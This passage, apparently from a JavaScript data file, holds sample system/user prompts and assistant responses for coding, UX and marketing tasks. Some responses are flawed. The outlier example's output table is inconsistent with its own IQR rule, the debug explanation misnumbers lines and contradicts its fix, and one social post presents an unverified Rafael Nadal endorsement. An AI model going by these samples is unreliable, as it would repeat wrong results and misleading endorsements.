                '\n\nThis code defines a function named `mark_outliers` that takes a `dataframe` as an argument. It computes the first quartile `Q1`, third quartile `Q3`, and interquartile range `IQR` of the passed `dataframe`. It then identifies outliers based on whether values in `dataframe` are outside the range `(Q1 - 1.5 * IQR)` to `(Q3 + 1.5 * IQR)` and returns a boolean dataframe `outliers` where the `True` values represent the location of outliers within the original `dataframe`.',
            },
          },
          {
            request: [
              {
                content: 'Explain me the next code as a developer',
                role: 'system',
              },
              {
                content:
                  '```python\nimport pandas as pd\nfrom sklearn.model_selection import train_test_split\n\n# Load data\ndata = pd.read_csv(\'data.csv\')\n\n# Create revenue categories\ndata[\'rev_categories\'] = pd.qcut(data[\'revenue\'], q=4, labels=False)\n\n# Split data into sample A and B, stratified on revenue\nA, B = train_test_split(data, test_size=0.5, stratify=data[\'rev_categories\'], random_state=42)\n```',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nThis code loads a CSV file `data.csv` as a Pandas dataframe. It then creates a new column in the dataframe called `rev_categories` which categorizes the revenue values into four equal-sized segments. This categorization is done using the `qcut()` function from Pandas. \n\nFinally, the `train_test_split()` function from scikit-learn is used to split the data into two subsets A and B, where 50% of the data goes to each subset. The splitting is done in a stratified manner based on the `rev_categories` column. This ensures that both subsets have a proportional representation of each revenue category. The random state parameter is set to 42 for reproducibility purposes. The subsets A and B can be used for further analysis or modeling.',
            },
          },
        ],
      },
      {
        shortTitle: 'CD',
        title: 'Code Documentation',
        examples: [
          {
            request: [
              {
                content: 'Create documentation for the next code',
                role: 'system',
              },
              {
                content:
                  '```\ndef mark_outliers(dataframe):\n    Q1 = dataframe.quantile(0.25)\n    Q3 = dataframe.quantile(0.75)\n    IQR = Q3 - Q1\n    outliers = (dataframe < (Q1 - 1.5 * IQR)) | (dataframe > (Q3 + 1.5 * IQR))\n    return outliers\n```',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nFunction Name: `mark_outliers`\n\nInput: `dataframe` - A pandas dataframe on which outlier detection needs to be performed\n\nOutput: `outliers` - A pandas boolean dataframe with `True` values indicating presence of outliers in the input dataframe\n\nFunctionality:\nThe function calculates the first quartile(Q1), third quartile (Q3) and inter-quartile range (IQR) of the given input dataframe. For each value in the dataframe, it checks if it is below `Q1 - 1.5 * IQR` or above `Q3 + 1.5 * IQR`. If the value is below or above this range, it is considered as an outlier and marked as `True` in the boolean dataframe.\n\nExplanation:\n1. `Q1 = dataframe.quantile(0.25)` - Calculates the first quartile (25th percentile) of the input dataframe.\n\n2. `Q3 = dataframe.quantile(0.75)` - Calculates the third quartile (75th percentile) of the input dataframe.\n\n3. `IQR = Q3 - Q1` - Calculates the inter-quartile range (IQR) of the input dataframe.\n\n4. `outliers = (dataframe < (Q1 - 1.5 * IQR)) | (dataframe > (Q3 + 1.5 * IQR))` - Creates a boolean dataframe with `True` values where each value in input dataframe is less than `Q1 - 1.5 * IQR` or greater than `Q3 + 1.5 * IQR`.\n\n5. Finally, the function returns the `outliers` boolean dataframe.\n\nExample:\n\nConsider that the input dataframe is:\n\n```\n     a    b    c\n0  2.5  1.0  5.5\n1  4.0  5.0  6.0\n2  5.5  6.0  7.5\n3  8.0  9.0  9.5\n4  7.0  8.0  7.0\n5  1.0  2.0  3.0\n6  3.0  4.0  2.0\n7  9.0  10.0 11.0\n8  3.5  4.5  5.0\n9  6.5  7.5  8.5\n```\n\nAfter calling the function as `mark_outliers(dataframe)`, the output is:\n\n```\n       a      b      c\n0  False  False  False\n1  False  False  False\n2  False  False  False\n3  False  False  False\n4  False  False  False\n5   True   True   True\n6  False  False  False\n7  False  False  False\n8  False  False  False\n9  False  False  False\n```\n\nFrom the output, we can deduce that the values `(1.0, 2.0, 3.0)` in columns `a, b, c` respectively are outliers.',
            },
          },
          {
            request: [
              {
                content: 'Create documentation for the next code',
                role: 'system',
              },
              {
                content:
                  '```python\nimport pandas as pd\nfrom sklearn.model_selection import train_test_split\n\n# Load data\ndata = pd.read_csv(\'data.csv\')\n\n# Create revenue categories\ndata[\'rev_categories\'] = pd.qcut(data[\'revenue\'], q=4, labels=False)\n\n# Split data into sample A and B, stratified on revenue\nA, B = train_test_split(data, test_size=0.5, stratify=data[\'rev_categories\'], random_state=42)\n```',
                role: 'user',
              },
            ],
            response: {
              content:
                '# Documentation\n\n## Objective\nThe objective of the code is to split the provided dataset into two samples A and B, stratified on revenue.\n\n## Input\nThe input of this code is a CSV file named "data.csv" containing the dataset to be used for splitting. \n\n## Dependencies\nThe code requires the following dependencies:\n * pandas: A Python data analysis library used to read CSV files and manipulate data.\n * scikit-learn (sklearn): A Python library for machine learning used to split the dataset into training and testing subsets.\n\n## Output\nThe output of this code are two datasets, A and B, which are stratified on revenue.\n\n## Description\n* **Step 1**: The CSV file is read using the `read_csv` function from pandas library and stored in the variable `data`. \n* **Step 2**: A new column named "rev_categories" is added to the dataset `data` through the pandas qcut method which will divide the \'revenue\' variable data into 4 equal parts based on quantiles.\n* **Step 3**: The dataset `data` is split into two samples `A` and `B` of equal size (test_size=0.5) by taking a stratified sample of rows based on the "rev_categories" variable that was created in step 2 using the `train_test_split` method of sklearn library.\n* **Step 4**: A and B datasets are returned as outputs.\n\n## Example\n```python\nimport pandas as pd\nfrom sklearn.model_selection import train_test_split\n\n# Load data\ndata = pd.read_csv(\'data.csv\')\n\n# Create revenue categories\ndata[\'rev_categories\'] = pd.qcut(data[\'revenue\'], q=4, labels=False)\n\n# Split data into sample A and B, stratified on revenue\nA, B = train_test_split(data, test_size=0.5, stratify=data[\'rev_categories\'], random_state=42)\n```\nIn this example, the code reads the CSV file \'data.csv\', adds a new column to the dataset storing that data in `data`. Then, Stratified sampling is performed using the `train_test_split` method from sklearn to split data into two samples `A` and `B`. Finally, `A` and `B` datasets are returned as outputs.',
            },
          },
        ],
      },
      {
        shortTitle: 'RE',
        title: 'Regular Expression',
        examples: [
          {
            request: [
              {
                content: 'Only write the regular expression with no explanation.',
                role: 'system',
              },
              {
                content: 'Write a regular expression that extracts all dates from a text file.',
                role: 'user',
              },
            ],
            response: {
              content: '\\d{1,2}/\\d{1,2}/\\d{4}',
            },
          },
          {
            request: [
              {
                content: 'Only write the regular expression with no explanation.',
                role: 'system',
              },
              {
                content:
                  'Write a regular expression that the username can contain letters, numbers, underscores, and dots. The username must start with a letter or a number. The domain can contain letters, numbers, underscores, and dots. The domain must have at least one dot and have a valid domain extension of 2 to 6 characters.',
                role: 'user',
              },
            ],
            response: {
              content: '^[a-zA-Z0-9][a-zA-Z0-9_.]*@[a-zA-Z0-9_.]+\\.[a-zA-Z]{2,6}$',
            },
          },
        ],
      },
      {
        shortTitle: 'RE',
        title: 'REGEX Explain',
        examples: [
          {
            request: [
              {
                content: 'Explain me this regular expression',
                role: 'system',
              },
              {
                content: 'Regular Expression (\\d{1,2}/\\d{1,2}/\\d{4})',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nThis regular expression matches a date string in the format of MM/DD/YYYY, where:\n\n- \\d{1,2} matches one or two digits representing the month (MM).\n- / matches a forward-slash character between the month and day.\n- \\d{1,2} matches one or two digits representing the day (DD).\n- / matches another forward-slash character between the day and year.\n- \\d{4} matches four digits representing the year (YYYY).\n\nOverall, this regular expression matches a wide range of possible dates, allowing for single or double-digit months and days, and four-digit years.',
            },
          },
          {
            request: [
              {
                content: 'Explain me this regular expression',
                role: 'system',
              },
              {
                content: 'Regular Expression (^[a-zA-Z0-9][a-zA-Z0-9_.]*@[a-zA-Z0-9_.]+\\.[a-zA-Z]{2,6}$)',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nThis regular expression matches a valid email address with the following conditions:\n\n- ^ and $ indicate the start and end of the string respectively, ensuring that the entire string matches the pattern.\n- [a-zA-Z0-9] matches a single character that can be any uppercase or lowercase alphabet or any digit.\n- [a-zA-Z0-9_.]* matches zero or more characters which can be either uppercase or lowercase alphabet, any digit, underscore (_), or dot (.)\n- @ matches a literal at sign.\n- [a-zA-Z0-9_.]+ matches one or more characters which can be either uppercase or lowercase alphabet, any digit, underscore (_), or dot (.)\n- \\. matches a literal dot.\n- [a-zA-Z]{2,6} matches any two to six uppercase or lowercase alphabets at the end of the string, specifying the top-level domain.\n\nPut together, this expression matches valid email addresses with one or more alphanumeric characters, followed by an @ symbol, an alphanumeric domain name with optional periods and underscores, and a valid top-level domain ending in two to six alphabets.',
            },
          },
        ],
      },
      {
        shortTitle: 'DC',
        title: 'Debug Code',
        examples: [
          {
            request: [
              {
                content: 'is the following code correct? if not, tell me what\'s wrong.',
                role: 'system',
              },
              {
                content:
                  'import pandas as pd\nfrom sklearn.linear_model import LinearRegresion\ndata= pd.read_csv(\'data.csv)\ndata[\'day_of_week]= data[\'day_of_week\'].replace({\'Monday\':1, \'Tuesday\':2, \'Wedneday\':3, \'Thrusday\':4, \'Friday\':5, \'Saturday\':6, \'Sunday\':7})\n X = data[[\'day_of_week\']]\ny = data[\'revenue\']\nmodel=LinearRegresion()\n model.fig(X,y)\n day = \'Tuesday\'\nrevenue=model.predit([[day]])\nprint(f\'The predicted revenue on day {day} is {revenue[0]})',
                role: 'user',
              },
            ],
            response: {
              content:
                'There are a few errors in the code. Here\'s a corrected version:\n\n```\nimport pandas as pd\nfrom sklearn.linear_model import LinearRegression\n\ndata = pd.read_csv(\'data.csv\')\ndata[\'day_of_week\'] = data[\'day_of_week\'].replace({\'Monday\': 1, \'Tuesday\': 2, \'Wednesday\': 3, \'Thursday\': 4, \'Friday\': 5, \'Saturday\': 6, \'Sunday\': 7})\n\nX = data[[\'day_of_week\']]\ny = data[\'revenue\']\n\nmodel = LinearRegression()\nmodel.fit(X, y)\n\nday = 2 # Tuesday\nrevenue = model.predict([[day]])\nprint(f\'The predicted revenue on day {day} is {revenue[0]}\')\n```\n\nHere\'s what was changed:\n- Line 4: `LinearRegresion` is misspelled, it should be `LinearRegression`.\n- Line 5: The `data.csv` file name is missing a closing quote.\n- Line 6: `day_of_week` is misspelled for Wednesday and Thursday.\n- Line 8: `fig` should be `fit` to train the model.\n- Line 11: We need to pass a numerical value for the day, not a string. We can use `2` instead of `\'Tuesday\'`.\n- Line 12: `predict` is misspelled. Also, we don\'t need double brackets around `day` because it\'s a single value, not an array.\n- Line 13: There\'s a closing parenthesis missing at the end of the line.',
            },
          },
          {
            request: [
              {
                content: 'is the following code correct? if not, tell me what\'s wrong.',
                role: 'system',
              },
              {
                content:
                  'import pandas as pd\nfrom sklearn.linear_model import LinearRegresion\ndata= pd.read_csv(\'data.csv)\ndata[\'day_of_week]= data[\'day_of_week\'].replace({\'Monday\':1, \'Tuesday\':2, \'Wedneday\':3, \'Thrusday\':4, \'Friday\':5, \'Saturday\':6, \'Sunday\':7})\n X = data[[\'day_of_week\']]\ny = data[\'revenue\']\nmodel=LinearRegresion()\n model.fig(X,y)\n day = \'Tuesday\'\nrevenue=model.predit([[day]])\nprint(f\'The predicted revenue on day {day} is {revenue[0]})',
                role: 'user',
              },
            ],
            response: {
              content:
                'There are a few errors in the code. Here\'s a corrected version:\n\n```\nimport pandas as pd\nfrom sklearn.linear_model import LinearRegression\n\ndata = pd.read_csv(\'data.csv\')\ndata[\'day_of_week\'] = data[\'day_of_week\'].replace({\'Monday\': 1, \'Tuesday\': 2, \'Wednesday\': 3, \'Thursday\': 4, \'Friday\': 5, \'Saturday\': 6, \'Sunday\': 7})\n\nX = data[[\'day_of_week\']]\ny = data[\'revenue\']\n\nmodel = LinearRegression()\nmodel.fit(X, y)\n\nday = 2 # Tuesday\nrevenue = model.predict([[day]])\nprint(f\'The predicted revenue on day {day} is {revenue[0]}\')\n```\n\nHere\'s what was changed:\n- Line 4: `LinearRegresion` is misspelled, it should be `LinearRegression`.\n- Line 5: The `data.csv` file name is missing a closing quote.\n- Line 6: `day_of_week` is misspelled for Wednesday and Thursday.\n- Line 8: `fig` should be `fit` to train the model.\n- Line 11: We need to pass a numerical value for the day, not a string. We can use `2` instead of `\'Tuesday\'`.\n- Line 12: `predict` is misspelled. Also, we don\'t need double brackets around `day` because it\'s a single value, not an array.\n- Line 13: There\'s a closing parenthesis missing at the end of the line.',
            },
          },
        ],
      },
    ],
  },

  {
    type: '--collection-main--category-studios--subcategory-digital--subcategory_level_2-design--',
    mode: [
      {
        shortTitle: 'DS',
        title: 'Design SVG',
        examples: [
          {
            request: [
              {
                content:
                  'I would like you to act as an SVG designer. I will ask you to create images, and you will come up with SVG code for the image. Do not write explanations.',
                role: 'system',
              },
              {
                content: 'give me an image of a red cicle',
                role: 'user',
              },
            ],
            response: {
              content: '```\n<svg width="50" height="50">\n  <circle cx="25" cy="25" r="20" fill="red" />\n</svg>\n```',
            },
          },
          {
            request: [
              {
                content:
                  'I would like you to act as an SVG designer. I will ask you to create images, and you will come up with SVG code for the image. Do not write explanations.',
                role: 'system',
              },
              {
                content: 'give me an image of a house and a tree',
                role: 'user',
              },
            ],
            response: {
              content:
                '```\n<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 300">\n  <rect x="50" y="100" width="200" height="150" fill="#8B4513" />\n  <polygon points="50,100 150,25 250,100" fill="#F4A460" />\n  <rect x="135" y="175" width="30" height="75" fill="#FFFFFF" />\n  <rect x="185" y="175" width="30" height="75" fill="#FFFFFF" />\n  <circle cx="100" cy="250" r="30" fill="#228B22" />\n</svg>\n```',
            },
          },
        ],
      },

      {
        shortTitle: 'NF',
        title: 'Navigation Flow',
        examples: [
          {
            request: [
              {
                content:
                  'I want you to act as a UX/UI developer. I will provide some details about the design of an app, website or other digital product, and it will be your job to come up with creative ways to improve its user experience.',
                role: 'system',
              },
              {
                content: 'I need help designing an intuitive navigation system for my new mobile application.',
                role: 'user',
              },
            ],
            response: {
              content:
                'Sure! To design an intuitive navigation system for your mobile application, we need to keep in mind the following principles:\n\n1. User Flow: We should define the user flow, that is, the steps a user will follow to achieve his goals (e.g., creating an account, browsing products, ordering a product, checkout, etc.)\n\n2. Navigation Types: We should also choose the right navigation types for each function, keeping in mind the user\'s needs and preferences (e.g., tabs, hamburger menu, bottom navigation, etc.)\n\n3. Navigation Hierarchy: We should organize the navigation hierarchy in a way that makes sense to users, by grouping similar functions together and sub-categorizing them with appropriate labels.\n\n4. Consistency: We should maintain consistency across the app in terms of navigation, by ensuring users can find the same functions in the same place every time. This helps build the user\'s mental model and makes it easier to use the app.\n\nWith these principles in mind, here\'s what I\'d suggest for an intuitive navigation system:\n\n1. Use simple and meaningful icons for each function, as they can help users identify the different sections of the app easily.\n\n2. Keep the navigation structure shallow, to make it easy for users to browse through the app. Limiting the depth of the navigation hierarchy can help them quickly find what they are looking for.\n\n3. Use an app-wide search bar at the top of the screen, to allow users to quickly find specific content.\n\n4. Use simple labels for each function, such as "Profile," "Messages," "Settings," etc.\n\n5. Use a bottom navigation bar for the most important sections of the app. This allows users to quickly navigate to the most frequently visited areas without having to dig through menus.\n\n6. Use hamburger menus for secondary functions, such as "Settings," "About" or functions that aren\'t needed as often.\n\n7. Keep the navigation buttons large enough, with clear touch targets, for ease of use.\n\n8. Lastly, enable gesture-based navigation like swipe or tap and drag for users who prefer to navigate this way.\n\nI hope this advice helps!',
            },
          },
          {
            request: [
              {
                content:
                  'I want you to act as a UX/UI developer. I will provide some details about the design of an app, website or other digital product, and it will be your job to come up with creative ways to improve its user experience.',
                role: 'system',
              },
              {
                content:
                  'I need help designing an intuitive flow for add $10 subscription to a mobile app that sell sport at home',
                role: 'user',
              },
            ],
            response: {
              content:
                'Sure, I\'d be happy to help you out!\n\nHere\'s a potential flow for adding a $10 subscription to a mobile app that sells sports at home:\n\n1. On the home screen of the app, add a prominent button or banner that says "Upgrade to Pro" or "Access More Workouts".\n2. When the user taps on this button or banner, they should be taken to a screen that provides more information about the benefits of upgrading to the pro version. This could include information such as:\n\n  * "Access to premium workout plans"\n  * "Exclusive video content from fitness experts"\n  * "Custom workout plans tailored to your goals"\n  * "Advanced progress tracking and analysis"\n\n3. If the user likes what they see and want to proceed with the upgrade, they can click a button that says "Subscribe" or "Upgrade Now".\n4. This should take them to a payment screen where they can enter their payment information and confirm their subscription.\n\nSome tips for making this flow as intuitive as possible:\n\n- Keep the flow as simple and straightforward as possible. Users don\'t want to navigate through multiple screens and options just to subscribe to the app.\n- Use simple, clear language throughout the flow. Avoid using technical terms or jargon that might confuse users.\n- Make the upgrade button or banner stand out with a visually appealing design or color scheme.\n- Use images or videos to showcase the benefits of the pro version in a visually appealing way. Show off some of the app\'s best features and content to entice users to upgrade.\n- Provide clear instructions and feedback throughout the payment process to ensure that users are confident and comfortable with entering their payment information.',
            },
          },
        ],
      },
      {
        shortTitle: 'RP',
        title: 'Research Plan',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a UX/UI',
                role: 'system',
              },
              {
                content: 'create a research plan',
                role: 'user',
              },
            ],
            response: {
              content:
                'Sure, I\'d be happy to create a research plan as a UX/UI designer. Here are the steps I would take to create a research plan:\n\n1. Define the research problem: The first step is to identify the core research question or problem that needs to be addressed. This may involve reviewing existing user data, conducting stakeholder interviews, and analyzing market research.\n\n2. Determine the research goals: Once the research problem is identified, it\'s important to define specific goals for the research. For example, these may include improving user engagement, increasing conversions, or identifying pain points in the current user experience.\n\n3. Develop research hypotheses: With defined goals, hypotheses can be developed to guide the research process, such as "Users are abandoning the shopping cart because of complex checkout processes."\n\n4. Define the research methodology: Based on the research goals and hypotheses, select the appropriate research methodology. This could include user interviews, usability testing, surveys, or competitive analysis.\n\n5. Recruit research participants: Identify potential participants for the research study, which will depend on the selected research methodology. If conducting user interviews, for example, recruiting participants could involve conducting a screening survey to identify target individuals.\n\n6. Collect data: Conduct research using the selected methodology, collecting data on user behavior, attitudes, and preferences.\n\n7. Analyze data: Once data is collected, it\'s important to conduct a thorough analysis to identify key patterns and insights.\n\n8. Develop insights and recommendations: With an understanding of user needs and behaviors, develop insights that can inform recommendations for improving the user experience. This may include changes to the product, messaging, or user interface.\n\n9. Present findings and recommendations: Finally, present findings and recommendations to stakeholders and other relevant team members, with clear actions and next steps identified.\n\nIn summary, a thorough research plan should include identifying the research problem, defining research goals and hypotheses, selecting a methodology, recruiting participants, collecting data, analyzing data, developing insights, and presenting findings and recommendations.',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as a UX/UI',
                role: 'system',
              },
              {
                content: 'write a small research plan',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nSure, here’s a small research plan:\n\nResearch Plan: Understanding User Needs for a Recipe App\n\nObjective: To gather insights on users’ needs, preferences, and expectations when using a recipe app.\n\nMethodology:\n\n1. User Interviews: Conduct individual interviews with users who frequently use recipe apps. The interviews will aim to uncover users’ goals, habits, and pain points when searching for and preparing recipes. We will also explore how users interact with recipe apps, what features they find most useful, and what improvements they would like to see.\n\n2. Surveys: Create an online survey to gather data from a wider pool of users. The survey will be designed to gather quantitative data on user demographics, frequency of app use, preferred features, and overall satisfaction with recipe apps.\n\n3. Competitor Analysis: Conduct a competitive analysis of popular recipe apps to identify any gaps in the market and potential areas for innovation. This will also provide insights into what features and functionalities are currently successful and what could be improved.\n\nTimeline:\n\nWeek 1-2: Plan research methods and design data collection tools\nWeek 3-4: Conduct user interviews and analyze qualitative data\nWeek 5: Analyze survey results and demographic data\nWeek 6: Conduct competitive analysis and identify key findings\nWeek 7: Synthesize data and develop insights\nWeek 8: Communicate findings and recommendations to stakeholders \n\nDeliverables:\n\n1. Research report: A comprehensive report outlining key findings, insights, and recommendations for developing a successful recipe app.\n2. User personas: Detailed profiles of users to help guide future product design and development.\n3. Journey Maps: Visualizations of user journeys through the recipe app to identify opportunities for improvement.\n4. Feature Prioritization Matrix: Matrix outlining prioritization of features based on user needs, business potential, and competitor analysis.',
            },
          },
        ],
      },
      {
        shortTitle: 'SP',
        title: 'Story Points',
        examples: [
          {
            request: [
              {
                content: 'Respond the story points for the next User Story',
                role: 'system',
              },
              {
                content:
                  'As a user, I want to be able to log into the application with my email and password so that I can access all of the features that require authentication.',
                role: 'user',
              },
            ],
            response: {
              content:
                'I would estimate this user story to be a 3 in story points. While it is an essential feature for any application that requires authentication, it is a relatively straightforward task that can be completed in a few hours. However, if there are additional requirements such as integrating with a third-party authentication provider or implementing two-factor authentication, then the story points may increase.',
            },
          },
          {
            request: [
              {
                content: 'Respond the story points for the next User Story',
                role: 'system',
              },
              {
                content: 'As a customer, I want to be able to add a product to my cart so that I can purchase it later',
                role: 'user',
              },
            ],
            response: {
              content:
                'The story points for this user story would depend on the complexity of the implementation. However, based on the given information, I would estimate that this user story could be completed in 2 to 5 story points, assuming the following:\n\n- The website already has some basic functionality for adding products to a cart.\n- The implementation involves adding a simple "Add to Cart" button to each product page and updating the cart count and total cost appropriately.\n- No complex business rules or integration with external systems are required.',
            },
          },
        ],
      },
      {
        shortTitle: 'AB',
        title: 'A/B Testing',
        examples: [
          {
            request: [
              {
                content: 'Respond with a A/B testing for the next User Story',
                role: 'system',
              },
              {
                content:
                  'As a user, I want to be able to log into the application with my email and password so that I can access all of the features that require authentication.',
                role: 'user',
              },
            ],
            response: {
              content:
                'A/B testing: \n\nA) Traditional login method where users enter their email and password into a login form and click a button to authenticate their credentials.\n\nB) Social media login method where users can choose to log in using their social media account credentials (e.g. Facebook, Google, Twitter). \n\nThe A/B testing will measure which method generates more logins, higher user engagement, and user satisfaction.',
            },
          },
          {
            request: [
              {
                content: 'Respond with a A/B testing for the next User Story',
                role: 'system',
              },
              {
                content: 'As a customer, I want to be able to add a product to my cart so that I can purchase it later',
                role: 'user',
              },
            ],
            response: {
              content:
                'As an A/B testing variation for this user story, we can test the placement and design of the "Add to Cart" button. In variation A, the "Add to Cart" button can be placed prominently in the center of the product page with a contrasting color to make it stand out. This could help attract the user\'s attention and make it easier for them to add products to their cart.\n\nIn variation B, we could move the "Add to Cart" button to a less prominent location, such as in the corner of the product page. This could test if users are more likely to add products to their cart if they have to actively search for the button, rather than having it prominently displayed.\n\nWe can then track metrics such as the number of products added to the cart, the click-through rate on the "Add to Cart" button, and the conversion rate to determine which variation is more effective.',
            },
          },
        ],
      },
      {
        shortTitle: 'KM',
        title: 'KPI',
        examples: [
          {
            request: [
              {
                content: 'What are the key performance metrics for the next UX',
                role: 'system',
              },
              {
                content:
                  'As a user, I want to be able to log into the application with my email and password so that I can access all of the features that require authentication.',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nThe key performance metrics for the next UX iteration focusing on the log-in feature could include:\n\n1. Conversion rate: Measure the percentage of users who successfully log in after entering their email and password. This will help determine whether the log-in process is smooth and user-friendly.\n\n2. Error rate: Measure the frequency and type of errors users experience when attempting to log in. With this metric, you can identify areas of the log-in process that may be causing confusion or frustration for users.\n\n3. Time to complete: Measure the amount of time it takes users to log in, from entering their email and password to accessing the app\'s features. If it takes too long to complete the log-in process, users may abandon the app entirely.\n\n4. User engagement: Measure the number of times users access the app\'s features and functions after successfully logging in. This indicates whether the log-in process is not only successful but also encourages users to continue using the app.\n\nBy tracking these metrics, you can identify areas for improvement in the log-in process and ensure that the UX delivers the best possible experience for users.',
            },
          },
          {
            request: [
              {
                content: 'What are the key performance metrics for the next UX',
                role: 'system',
              },
              {
                content: 'As a customer, I want to be able to add a product to my cart so that I can purchase it later',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nHere are some key performance metrics for the next UX related to adding a product to the cart:\n\n1. Conversion rate: This measures the percentage of users who successfully add a product to their cart and go on to complete their purchase. A high conversion rate indicates a smooth and intuitive cart experience.\n\n2. Cart abandonment rate: This measures the percentage of users who add a product to their cart but do not complete their purchase. A low cart abandonment rate indicates a frictionless cart experience.\n\n3. Time to add a product: This measures the time it takes for a user to add a product to their cart. A quick and easy process will result in a shorter time to add a product.\n\n4. Cart accuracy: This measures the accuracy of cart item pricing, quantity, and availability to ensure that users are not surprised when they get to the checkout page.\n\n5. User satisfaction: This measures how satisfied users are with the cart experience overall through surveys, feedback, or Net Promoter Score (NPS) to identify areas of improvement.',
            },
          },
        ],
      },
    ],
  },

  {
    type: '--collection-main--category-studios--subcategory-digital--subcategory_level_2-digital-marketing--',
    mode: [
      {
        shortTitle: 'GA',
        title: 'Google Ads',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a marketing specialist',
                role: 'system',
              },
              {
                content: 'give 10 keywords ideas for credit card to add in google ads',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\n1. Cashback Credit Cards\n2. Travel Reward Credit Cards\n3. No Annual Fee Credit Cards\n4. Balance Transfer Credit Cards\n5. Low Interest Credit Cards\n6. Student Credit Cards\n7. Secured Credit Cards\n8. Premium Credit Cards\n9. Business Credit Cards\n10. Airline Miles Credit Cards',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as a marketing specialist',
                role: 'system',
              },
              {
                content: 'Give me 10 titles with less than 30 characters for my No Annual Fee Credit Cards',
                role: 'user',
              },
            ],
            response: {
              content:
                '1. FeeFree \n2. NoXtraFee \n3. NoAnnual \n4. Cashless \n5. ZeroFee \n6. SaveMoney \n7. PayLess \n8. CardFree \n9. MoneyWise \n10. BudgetCard',
            },
          },
        ],
      },

      {
        shortTitle: 'EM',
        title: 'Email Marketing',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a marketing specialist',
                role: 'system',
              },
              {
                content:
                  'can you create me a sales email to a cold audience offering an online sport training that has 90 day money back guarantee and is only $29,99',
                role: 'user',
              },
            ],
            response: {
              content:
                'Subject: Take Your Athletic Performance to the Next Level with Our Online Sport Training Program\n\nDear [First Name],\n\nAre you tired of not seeing results in your sport performance? Do you want to take your skills to the next level?\n\nOur online sport training program can help you achieve your goals. We offer comprehensive training in your sport - from basketball to football and everything in between. Our training program is designed specifically to help you achieve your personal best and gives you the tools to succeed in your sport.\n\nWe understand that life can be unpredictable and that\'s why we\'re proud to offer a 90-day money-back guarantee. We\'re confident in our program and we know that you\'ll see results too.\n\nAnd best of all, our program is only $29.99 - that\'s less than a dollar per day for expert online training.\n\nOur program will help you:\n\n- Improve your agility and quickness\n- Boost your speed and endurance\n- Develop proper technique and form\n- Increase your strength and power\n- Enhance your mental toughness and confidence\n\nWe know that you\'re serious about your sport and we want to help you succeed. Our online sport training program is here to help you achieve your goals.\n\nDon\'t wait any longer, sign up today and start your journey towards becoming a better athlete.\n\nSincerely,\n\n[Your Name]',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as a marketing specialist',
                role: 'system',
              },
              {
                content:
                  'can you create me a marketing mail for a user purchased the online training on the application yesterday.',
                role: 'user',
              },
            ],
            response: {
              content:
                'Dear [Name],\n\nWe hope this message finds you well. We wanted to take a moment to thank you for choosing to enhance your skills through our online training program on [Application Name].\n\nWe understand how challenging it can be to learn new skills in today\'s fast-paced world, and we commend you for taking the initiative to invest in yourself. Our online training program is designed to help you achieve your personal and professional development goals, and we are thrilled to have you as a part of our community.\n\nAs a new member, we want to ensure that you have access to all the tools and resources required for your success. Therefore, we have prepared a welcome guide that outlines everything you need to know to get started with our online training program. \n\nThis guide includes details about your program, best practices for studying effectively, and how to prepare for your assessments. And if you ever need additional support along the way, you can always reach out to our customer service team. \n\nThank you again for trusting us with your education, and don\'t hesitate to let us know how we can help you succeed. We look forward to partnering with you on this exciting journey.\n\nSincerely,\n\n[Your Name]\n\nMarketing Specialist at [Application Name]',
            },
          },
        ],
      },
      {
        shortTitle: 'SM',
        title: 'Social Media',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a marketing specialist',
                role: 'system',
              },
              {
                content: 'can you create a social media post based in a online sport training program',
                role: 'user',
              },
            ],
            response: {
              content:
                'Sure, here\'s a sample social media post promoting an online sport training program:\n\n"Level up your game with our online sport training program! Train with top coaches who know what it takes to win. Tailor your workouts to your specific sport and skill level. Boost your speed, strength and agility all from the comfort of your home. Get ready to dominate on the field or court. Sign up now and join the winning team! 🏆👊 #SportTraining #OnlineTraining #WinningTeam"',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as a marketing specialist',
                role: 'system',
              },
              {
                content:
                  'can you create a social media post based in a online sport training program that is recomended by Rafael Nadal',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nAttention all sports enthusiasts! 🏆 \n\nAre you ready to take your game to the next level? 🚀 Look no further than the online sport training program recommended by none other than tennis legend Rafael Nadal himself! 🎾\n\nWith personalized training sessions and top-notch instruction from some of the world\'s best coaches, this program is the perfect way to achieve your athletic goals. Plus, it\'s all online, so you can work out from the comfort of your own home! 🏠\n\nDon\'t let another day go by without reaching your full potential. Join the program trusted by the pros - sign up today and get ready to crush your fitness goals! 💪 #TrainLikeNadal #OnlineSportTraining #AthleticGoals #FitnessJourney.',
            },
          },
        ],
      },
      {
        shortTitle: 'TW',
        title: 'Twitter Messages',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a marketing specialist',
                role: 'system',
              },
              {
                content: 'Can you create a Twit bases in online sport training program',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nAbsolutely! Here is a possible tweet to promote an online sports training program:\n\n"Take your game to the next level with our online sports training program! Access personalized workouts, track your progress, and connect with expert coaches, all from the comfort of your home. Sign up now and start dominating the competition. #sports #training #online"',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as a marketing specialist',
                role: 'system',
              },
              {
                content:
                  'Can you create a Twitter thread bases in online sport training program that is recomended by Rafael Nadal',
                role: 'user',
              },
            ],
            response: {
              content:
